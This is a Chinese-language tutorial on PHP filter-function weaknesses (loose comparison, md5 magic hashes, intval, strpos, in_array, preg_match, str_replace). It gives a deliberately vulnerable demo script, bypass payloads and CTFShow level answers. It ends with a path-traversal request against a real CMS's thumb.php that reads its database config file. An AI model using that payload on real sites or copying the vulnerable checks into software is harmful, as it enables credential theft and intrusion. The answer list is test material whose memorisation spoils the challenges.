```plain
#知识点：
1、过滤函数缺陷绕过
2、CTF考点与代码审计

#详细点：最常见函数使用
==与===
md5
intval
strpos
in_array
preg_match
str_replace




<?php
header("Content-Type:text/html;charset=utf-8");
$flag='xiaodi ai chi xigua!';

//1、== ===缺陷绕过 == 弱类型对比 ===还会比较类型
$a=1;
if($a==$_GET['x']){
 echo $flag;
}

//1.0 +1 1a

$a='1';
if($a===$_GET['y']){
 echo $flag;
}

//1.0 +1等


//2、MD5函数缺陷绕过 ==弱对比 ===强类型对比
if($_GET['name'] != $_GET['password']){
 if(MD5($_GET['name']) == MD5($_GET['password'])){
 echo $flag;
 }
 echo '?';
}
//==
//echo MD5('QNKCDZO');
//echo MD5('240610708');

//===
//name[]=1&password[]=2

//3、intval缺陷绕过
$i='666';
$ii=$_GET['n'];
if(intval($ii==$i)){
 echo $flag;
}

// 666.0 +666

$i='666';
$ii=$_GET['n'];
if(intval($ii==$i,0)){
 echo $flag;
}

//0x29a

//4、对于strpos()函数，我们可以利用换行进行绕过（%0a）
$i='666';
$ii=$_GET['h'];
if(strpos($ii==$i,"0")){
 echo $flag;
}


//?num=%0a666



//5、in_array第三个参数安全
$whitelist = [1,2,3];
$page=$_GET['i'];
if (in_array($page, $whitelist)) {
 echo "yes";
}

//?i=1ex

//6、preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错
if(isset($_GET['num'])){
 $num = $_GET['num'];
 if(preg_match("/[0-9]/", $num)){
 die("no no no!");
 }
 if(intval($num)){
 echo $flag;
 }
}


//?num[]=1

//7、str_replace无法迭代过滤
$sql=$_GET['s'];
$sql=str_replace('select','',$sql);
echo $sql;

//?s=sselectelect

?>
```

- #### 原理-缺陷函数-使用讲解-本地

```plain
原理-缺陷函数-使用讲解-本地
1、== ===缺陷绕过 == 弱类型对比，不会对比类型 ===还会比较类型
$a=1;
if($a==$_GET['x']){
 echo $flag;
}
//1.0 +1 1a
```

![1645089310161-d0a684d6-e241-4d5b-84ab-eccb7c7a0dac.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111252757-1004126028.png)

```plain
$a='1';
if($a===$_GET['y']){
 echo $flag;
}
这个判断就可以确定唯一性，不能更改。
```

```plain
2、MD5函数缺陷绕过 ==弱对比 ===强类型对比
if($_GET['name'] != $_GET['password']){
 if(MD5($_GET['name']) == MD5($_GET['password'])){
 echo $flag;
 }
 echo '?';
}
0e开头的md5值：https://www.cnblogs.com/Oran9e/p/6537204.html
//==
//echo MD5('QNKCDZO');  
0e830400451993494058024219903391
//echo MD5('240610708');
0e462097431906509019562988736854
```

![1645089442049-f9cb027e-da8c-48eb-9373-4c00bbbf2942.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111307816-114864713.png)

```plain
if($_GET['name'] != $_GET['password']){
 if(MD5($_GET['name']) === MD5($_GET['password'])){
 echo $flag;
 }
 echo '?';
}
Md5不能判断数组，判断为null
//===
//name[]=1&password[]=2
```

![1645089492453-dfa4ba6d-f03e-4bf9-81ce-b061c09b302a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111318887-1733433541.png)

```plain
3、intval缺陷绕过
Intval 使用：https://www.runoob.com/php/php-intval-function.html
```

![1645089554193-32d4c132-f183-45da-936f-fb0f4bb06992.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111327718-622883167.png)

```plain
$i='666';
$ii=$_GET['n'];
if(intval($ii==$i)){
 echo $flag;
}
// 666.0 +666
```

![1645089578133-ea2f53bd-bc9a-4e2e-b12c-f6086eabc497.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111341964-1137960436.png)

```plain
$i='666';
$ii=$_GET['n1'];
if(intval($ii==$i,0)){
 echo $flag;
}
如果字符串以 "0" 开始，使用 8 进制(octal)；

//0x29a
```

![1645089599799-52720c25-a86b-454c-b01e-ec8327bcb988.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111355700-338392360.png)

```plain
4、对于strpos()函数，我们可以利用换行进行绕过（%0a）
$i='666';
$ii=$_GET['h'];
if(strpos($i,$ii,"0")){
    echo $flag;
}

//?num=%0a666
好像不太行。
5、in_array第三个参数安全
```

![1645089655383-73099a0f-b193-427a-941e-19ea86b80ab2.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111413173-460324828.png)

```plain
$whitelist = [1,2,3];
$page=$_GET['i'];
if (in_array($page, $whitelist)) {
 echo "yes";
}
没有TRUE相当于==，设置了TRUE相当于===
//?i=1ex

6、preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错
preg_match匹配不了数组。
if(isset($_GET['num'])){
 $num = $_GET['num'];
 if(preg_match("/[0-9]/", $num)){
 die("no no no!");
 }
 if(intval($num)){
 echo $flag;
 }
}
//?num[]=1

7、str_replace无法迭代过滤
$sql=$_GET['s'];
$sql=str_replace('select','',$sql);
echo $sql;

//?s=sselectelect
```

- #### 实践-CTFShow-PHP特性-89关卡

```plain
89关：?num[]=1
90关：?num=4476.0
91关：?cmd=%0aphp
92关：?num=010574
93关：?num=010574
94关：?num= 010574
95关：?u=./flag.php
```

- #### 实践-代码审计-过滤缺陷-文件读取

```plain
全局搜索str_replace函数，发现：
```

![1645089754268-99eb1586-b455-49d4-b4fe-60c664873bc2.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111434324-1511716939.png)

```plain
控制dir，可以任意读取文件。/include/thumb.php?dir=.....///http\.....//\config/config_db.php
```

![1645089783208-dfac2036-ea59-4512-af82-7ed9b97cc756.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111444552-266197836.png)